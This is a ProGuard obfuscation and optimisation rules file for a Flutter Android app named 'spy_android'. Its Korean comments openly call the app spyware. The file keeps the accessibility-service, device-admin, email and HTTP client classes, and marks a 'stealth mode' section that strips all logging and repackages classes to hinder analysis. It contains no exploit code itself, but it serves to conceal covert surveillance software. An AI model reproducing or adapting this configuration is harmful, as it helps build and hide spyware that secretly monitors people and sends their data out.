# ProGuard 규칙 파일 - APK 난독화 및 최적화

# 🔥 기본 Flutter 보존 규칙
-keep class io.flutter.app.** { *; }
-keep class io.flutter.plugin.**  { *; }
-keep class io.flutter.util.**  { *; }
-keep class io.flutter.view.**  { *; }
-keep class io.flutter.**  { *; }
-keep class io.flutter.plugins.**  { *; }

# 🔥 메인 액티비티 보존
-keep class com.example.spy_android.MainActivity { *; }

# 🔥 네이티브 서비스들 보존 (중요!)
-keep class com.example.spy_android.services.** { *; }
-keep class com.example.spy_android.receivers.** { *; }
-keep class com.example.spy_android.activities.** { *; }

# 🔥 접근성 서비스 보존
-keep class * extends android.accessibilityservice.AccessibilityService { *; }

# 🔥 브로드캐스트 리시버 보존
-keep class * extends android.content.BroadcastReceiver { *; }

# 🔥 디바이스 관리자 보존
-keep class * extends android.app.admin.DeviceAdminReceiver { *; }

# 🔥 이메일 라이브러리 보존
-keep class javax.mail.** { *; }
-keep class javax.activation.** { *; }
-keep class com.sun.mail.** { *; }

# 🔥 HTTP 클라이언트 보존
-keep class okhttp3.** { *; }
-keep class retrofit2.** { *; }

# 🔥 JSON 처리 보존
-keep class com.google.gson.** { *; }
-keep class org.json.** { *; }

# 🔥 Android 컴포넌트 보존
-keep class androidx.** { *; }
-keep class android.support.** { *; }

# 🔥 리플렉션 사용 클래스 보존
-keepattributes Signature
-keepattributes *Annotation*
-keepattributes SourceFile,LineNumberTable

# 🔥 네이티브 메서드 보존
-keepclasseswithmembernames class * {
    native <methods>;
}

# 🔥 열거형 보존
-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

# 🔥 시리얼라이제이션 보존
-keepclassmembers class * implements java.io.Serializable {
    static final long serialVersionUID;
    private static final java.io.ObjectStreamField[] serialPersistentFields;
    private void writeObject(java.io.ObjectOutputStream);
    private void readObject(java.io.ObjectInputStream);
    java.lang.Object writeReplace();
    java.lang.Object readResolve();
}

# 🔥 암호화 관련 보존
-keep class javax.crypto.** { *; }
-keep class java.security.** { *; }

# 🔥 스파이웨어 특화 설정
# 클래스명 난독화하되 기능은 보존
-keepclassmembernames class com.example.spy_android.** {
    public <methods>;
}

# 🔥 경고 무시 (라이브러리 호환성)
-dontwarn javax.mail.**
-dontwarn javax.activation.**
-dontwarn okhttp3.**
-dontwarn okio.**
-dontwarn retrofit2.**

# 🔥 최적화 옵션
-optimizations !code/simplification/arithmetic,!code/simplification/cast,!field/*,!class/merging/*
-optimizationpasses 5
-allowaccessmodification
-dontpreverify

# 🔥 디버그 정보 제거 (스텔스 모드)
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int i(...);
    public static int w(...);
    public static int d(...);
    public static int e(...);
}

# 🔥 패키지명 난독화
-repackageclasses 'a'
-flattenpackagehierarchy

# 🔥 스택 트레이스 난독화 방지 (디버깅용)
-keepattributes SourceFile,LineNumberTable

# 🔥 웹뷰 사용시 보존
-keepclassmembers class fqcn.of.javascript.interface.for.webview {
   public *;
}

# 🔥 권한 관련 클래스 보존
-keep class android.permission.** { *; }
-keep class androidx.core.app.ActivityCompat { *; }
-keep class androidx.core.content.ContextCompat { *; }